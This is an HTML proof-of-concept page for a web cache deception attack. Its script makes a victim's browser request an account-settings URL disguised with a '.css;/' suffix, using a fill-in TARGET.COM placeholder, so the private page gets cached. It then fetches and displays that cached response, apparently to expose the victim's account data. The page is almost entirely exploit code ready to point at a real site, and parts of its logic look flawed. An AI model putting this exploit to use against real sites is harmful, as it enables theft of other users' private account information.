<!DOCTYPE html>
<html>
<head>
    <title>Web Cache Deception PoC</title>
</head>
<body>
<h1>Web Cache Deception PoC</h1>

<p>This page forces the victim to load a cache-poisoning URL and then attempts to retrieve the cached response.</p>

<button onclick="triggerVictimRequest()">1. Load Victim Request</button>
<button onclick="fetchCached()">2. Fetch Cached Content</button>

<pre id="output"></pre>

<script>
    // Replace this with your target endpoint
    const TARGET = "https://TARGET.COM/account/settings.css;/";

    function log(msg) {
        document.getElementById("output").textContent += msg + "\n";
    }

    // Step 1: victim loads the poisoned URL
    function triggerVictimRequest() {
        const img = new Image();
        img.src = TARGET + "?v=" + Date.now();

        img.onload = () => log("[Victim] Request sent (check server for MISS)");
        img.onerror = () => log("[Victim] Request sent (possible cached HIT)");
    }

    // Step 2: attacker fetches the cached content
    async function fetchCached() {
        log("[Attacker] Fetching cached content...");

        try {
            const res = await fetch(TARGET + "?a=1", { credentials: "include" });
            const text = await res.text();

            log("Response headers: " + [...res.headers].map(h=>h.join(": ")).join(" | "));
            log("\n--- Cached Response Body ---\n" + text);
        } catch (e) {
            log("Error fetching cached content: " + e);
        }
    }
</script>

</body>
</html>
